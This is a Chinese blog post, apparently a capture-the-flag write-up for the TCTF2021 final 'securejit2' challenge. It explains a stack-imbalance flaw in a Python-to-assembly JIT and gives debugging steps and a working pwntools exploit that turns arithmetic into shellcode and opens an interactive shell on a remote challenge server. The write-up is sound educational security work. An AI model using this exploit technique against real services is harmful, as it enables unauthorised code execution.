@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="no1r">
+    
+    <title>
+        
+            TCTF2021 FINAL securejit2 |
+        
+        no1r&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/no1r.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#29B2CC","avatar":"/images/no1r.svg","favicon":"/images/no1r.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"780px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.2"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                no1r&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">TCTF2021 FINAL securejit2</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/no1r.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">no1r</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2020-06-25 19:28:02
+    </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p><a class="link"   target="_blank" rel="noopener" href="https://github.com/no1rr/MyCTFChallenges/tree/master/tctf2021/securejit2" >附件下载<i class="fas fa-external-link-alt"></i></a></p>
+<p>脚本大致逻辑是将python代码编译成汇编代码，实现基本的算术运算</p>
+<p>脚本开头有原作者博客地址，下了一份原脚本与题目对比，发现赛题去掉了对函数是否是main函数的判断和visit_Subscript函数，并且题目最后使用mmap开了一块可读可写可执行的内存，把汇编代码放到内存中并执行。猜测有可能是写shellcode</p>
+<p>为了方便查看汇编代码，patch下程序，把汇编代码保存到文件中</p>
+<p><img src="https://i.loli.net/2021/11/25/8gtWqaiSKkERMeO.png" alt="image-20211125105945547"></p>
+<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>代码中在调用未定义的函数时，</p>
+<p>例如</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">	a()</span></span><br><span class="line"><span class="string">	b()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF\n&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>编译后的汇编指令是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">seg000:0000000000000000                 push    rbp</span><br><span class="line">seg000:0000000000000001                 mov     rbp, rsp</span><br><span class="line">seg000:0000000000000004                 call    $+5</span><br><span class="line">seg000:0000000000000009                 push    rax</span><br><span class="line">seg000:000000000000000A                 pop     rax</span><br><span class="line">seg000:000000000000000B                 call    $+5</span><br><span class="line">seg000:0000000000000010                 push    rax</span><br><span class="line">seg000:0000000000000011                 pop     rax</span><br><span class="line">seg000:0000000000000012                 pop     rbp</span><br><span class="line">seg000:0000000000000013                 retn</span><br><span class="line">seg000:0000000000000014 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:0000000000000014                 push    rbp</span><br><span class="line">seg000:0000000000000015                 mov     rbp, rsp</span><br><span class="line">seg000:0000000000000018                 mov     rax, 1</span><br><span class="line">seg000:000000000000001F                 mov     rdi, 1</span><br><span class="line">seg000:0000000000000026                 mov     rsi, rbp</span><br><span class="line">seg000:0000000000000029                 add     rsi, 10h</span><br><span class="line">seg000:000000000000002D                 mov     rdx, 1</span><br><span class="line">seg000:0000000000000034                 syscall                 ; Low latency system call</span><br><span class="line">seg000:0000000000000036                 pop     rbp</span><br><span class="line">seg000:0000000000000037                 retn</span><br></pre></td></tr></table></figure>
+
+<p>可以看到调用未定义的函数时，汇编指令是<code>call $5</code>， 相当于什么都没做。问题在于call指令会把下一条指令的地址push到栈中，如果是正常情况，在被调函数的末尾ret指令会把地址出栈。但在上面的例子中，由于a,b函数不存在，返回地址就会残留在栈中，栈平衡会遭到破坏，这样就可以控制rbp和rip</p>
+<p><strong>下面通过调试验证</strong></p>
+<p>首先添加代码，目的是在汇编代码执行前让python脚本停下来</p>
+<p><img src="https://i.loli.net/2021/11/25/Zr7oyhUSzNOVnIH.png" alt="image-20211125112235538"></p>
+<p>运行程序，在新终端执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb attach `pidof python3`</span><br></pre></td></tr></table></figure>
+
+<p>gdb查看内存情况，找到rwx的一段内存并下断</p>
+<p><img src="https://i.loli.net/2021/11/25/3oc8YQy6tBwGFuT.png" alt="image-20211125113430506"></p>
+<p>继续运行程序，gdb断在第一条指令，此时rbp指向内容为0x7，返回地址为0x7fff47b920f0</p>
+<p><img src="https://i.loli.net/2021/11/25/aRyr3LqhsXgeUFH.png" alt="image-20211125115021907"></p>
+<p>继续运行，发现rbp和返回地址分别变成了call $5指令的下一条指令的地址</p>
+<p><img src="https://i.loli.net/2021/11/25/kDupIsjzNwLdQiy.png" alt="image-20211125115127691"></p>
+<p>至此我们可以劫持rbp和rip为程序中的某条指令的地址，可以多次执行程序。</p>
+<p>再来看下面一段代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">	a = 0x1010</span></span><br><span class="line"><span class="string">	a *= 20</span></span><br><span class="line"><span class="string">	a -= 50</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF\n&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">seg000:0000000000000000                 push    0</span><br><span class="line">seg000:0000000000000002                 push    rbp</span><br><span class="line">seg000:0000000000000003                 mov     rbp, rsp</span><br><span class="line">seg000:0000000000000006                 push    1010h</span><br><span class="line">seg000:000000000000000B                 pop     qword ptr [rbp+8] &lt;--</span><br><span class="line">seg000:000000000000000E                 push    qword ptr [rbp+8] &lt;--</span><br><span class="line">seg000:0000000000000011                 push    14h</span><br><span class="line">seg000:0000000000000013                 pop     rdx</span><br><span class="line">seg000:0000000000000014                 pop     rax</span><br><span class="line">seg000:0000000000000015                 imul    rdx</span><br><span class="line">seg000:0000000000000018                 push    rax</span><br><span class="line">seg000:0000000000000019                 pop     qword ptr [rbp+8] &lt;--</span><br><span class="line">seg000:000000000000001C                 push    qword ptr [rbp+8] &lt;--</span><br><span class="line">seg000:000000000000001F                 push    32h ; &#39;2&#39;</span><br><span class="line">seg000:0000000000000021                 pop     rdx</span><br><span class="line">seg000:0000000000000022                 pop     rax</span><br><span class="line">seg000:0000000000000023                 sub     rax, rdx</span><br><span class="line">seg000:0000000000000026                 push    rax</span><br><span class="line">seg000:0000000000000027                 pop     qword ptr [rbp+8]</span><br><span class="line">seg000:000000000000002A                 pop     rbp</span><br><span class="line">seg000:000000000000002B                 lea     rsp, [rsp+8]</span><br><span class="line">seg000:0000000000000030                 retn</span><br><span class="line">seg000:0000000000000031 ; ------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>变量a保存在栈中，通过rbp寻址， 修改栈中的内容</p>
+<p>如果控制rbp指向代码段，代码段中的指令就会被当成变量进行算术运算，就可以修改汇编代码</p>
+<p>所以思路就很清晰了，调用未定义函数劫持rip和rbp到代码段，再通过算术运算修改代码为shellcode</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./entry&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;118.195.199.18&quot;</span>,<span class="number">40404</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    A()</span></span><br><span class="line"><span class="string">    f = 0x050F5801</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    e = 0x6AE68948</span></span><br><span class="line"><span class="string">    e *=0x10000</span></span><br><span class="line"><span class="string">    e *=0x10000</span></span><br><span class="line"><span class="string">    e +=0x00000001</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    d = 0x5F8287E0</span></span><br><span class="line"><span class="string">    d +=0x5F8287E0</span></span><br><span class="line"><span class="string">    d *=0x10000</span></span><br><span class="line"><span class="string">    d *=0x10000</span></span><br><span class="line"><span class="string">    d +=0x31000001</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    c = 0x00BAE689</span></span><br><span class="line"><span class="string">    c *=0x10000</span></span><br><span class="line"><span class="string">    c *=0x10000</span></span><br><span class="line"><span class="string">    c +=0x48C78948</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    b = 0x050F5802</span></span><br><span class="line"><span class="string">    b *=0x10000</span></span><br><span class="line"><span class="string">    b *=0x10000</span></span><br><span class="line"><span class="string">    b +=0x6AF631E7</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    a = 0x79486761</span></span><br><span class="line"><span class="string">    a +=0x10000000</span></span><br><span class="line"><span class="string">    a *=0x10000</span></span><br><span class="line"><span class="string">    a *=0x10000</span></span><br><span class="line"><span class="string">    a +=0x6C666890</span></span><br><span class="line"><span class="string">    A()</span></span><br><span class="line"><span class="string">    A()</span></span><br><span class="line"><span class="string">    A()</span></span><br><span class="line"><span class="string">    A()</span></span><br><span class="line"><span class="string">    A()</span></span><br><span class="line"><span class="string">    A()</span></span><br><span class="line"><span class="string">    A() # &lt;-rbp</span></span><br><span class="line"><span class="string">def B():</span></span><br><span class="line"><span class="string">    a = 0</span></span><br><span class="line"><span class="string">    a = 0 </span></span><br><span class="line"><span class="string">    a = 0</span></span><br><span class="line"><span class="string">    a = 0</span></span><br><span class="line"><span class="string">    a = 0</span></span><br><span class="line"><span class="string">    a = 0</span></span><br><span class="line"><span class="string">    a = 0</span></span><br><span class="line"><span class="string">    a = 0</span></span><br><span class="line"><span class="string">EOF\n&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&lt;xxx&gt;`.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一次遇到jit题目，做了整整一天才做出来，但也学到了很多东西，特别是调试的知识</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：TCTF2021 FINAL securejit2</li>
+        <li>Post author：no1r</li>
+        <li>Create time：2020-06-25 19:28:02</li>
+        <li>
+            Post link：https://no1rr.github.io/2020/06/25/tctf-secure-jit/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">no1r</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.2</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.2/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
